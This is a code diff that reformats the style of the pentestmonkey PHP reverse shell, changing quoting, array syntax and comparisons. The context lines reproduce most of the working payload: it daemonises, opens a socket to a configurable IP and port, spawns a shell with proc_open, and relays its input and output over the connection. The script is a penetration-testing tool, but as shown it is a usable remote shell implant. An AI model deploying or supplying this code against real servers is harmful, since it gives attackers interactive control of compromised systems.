@@ -45,7 +45,7 @@
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
 set_time_limit(0);
-$VERSION = "1.0";
+$VERSION = '1.0';
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
@@ -64,30 +64,30 @@ $debug = 0;
 if (function_exists('pcntl_fork')) {
     // Fork and have the parent process exit
     $pid = pcntl_fork();
-    
-    if ($pid == -1) {
+
+    if (-1 == $pid) {
         printit("ERROR: Can't fork");
         exit(1);
     }
-    
+
     if ($pid) {
         exit(0);  // Parent exits
     }
 
     // Make the current process a session leader
     // Will only succeed if we forked
-    if (posix_setsid() == -1) {
+    if (-1 == posix_setsid()) {
         printit("Error: Can't setsid()");
         exit(1);
     }
 
     $daemon = 1;
 } else {
-    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+    printit('WARNING: Failed to daemonise.  This is quite common and not fatal.');
 }
 
 // Change to a safe directory
-chdir("/");
+chdir('/');
 
 // Remove any umask we inherited
 umask(0);
@@ -104,11 +104,11 @@ if (!$sock) {
 }
 
 // Spawn shell process
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
+$descriptorspec = [
+   0 => ['pipe', 'r'],  // stdin is a pipe that the child will read from
+   1 => ['pipe', 'w'],  // stdout is a pipe that the child will write to
+   2 => ['pipe', 'w'],   // stderr is a pipe that the child will write to
+];
 
 $process = proc_open($shell, $descriptorspec, $pipes);
 
@@ -129,26 +129,26 @@ printit("Successfully opened reverse shell to $ip:$port");
 while (1) {
     // Check for end of TCP connection
     if (feof($sock)) {
-        printit("ERROR: Shell connection terminated");
+        printit('ERROR: Shell connection terminated');
         break;
     }
 
     // Check for end of STDOUT
     if (feof($pipes[1])) {
-        printit("ERROR: Shell process terminated");
+        printit('ERROR: Shell process terminated');
         break;
     }
 
     // Wait until a command is end down $sock, or some
     // command output is available on STDOUT or STDERR
-    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $read_a = [$sock, $pipes[1], $pipes[2]];
     $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
     // If we can read from the TCP socket, send
     // data to process's STDIN
     if (in_array($sock, $read_a)) {
         if ($debug) {
-            printit("SOCK READ");
+            printit('SOCK READ');
         }
         $input = fread($sock, $chunk_size);
         if ($debug) {
@@ -161,7 +161,7 @@ while (1) {
     // send data down tcp connection
     if (in_array($pipes[1], $read_a)) {
         if ($debug) {
-            printit("STDOUT READ");
+            printit('STDOUT READ');
         }
         $input = fread($pipes[1], $chunk_size);
         if ($debug) {
@@ -174,7 +174,7 @@ while (1) {
     // send data down tcp connection
     if (in_array($pipes[2], $read_a)) {
         if ($debug) {
-            printit("STDERR READ");
+            printit('STDERR READ');
         }
         $input = fread($pipes[2], $chunk_size);
         if ($debug) {
@@ -195,7 +195,7 @@ proc_close($process);
 function printit($string)
 {
     if (!$daemon) {
-        print "$string\n";
+        echo "$string\n";
     }
 }
 
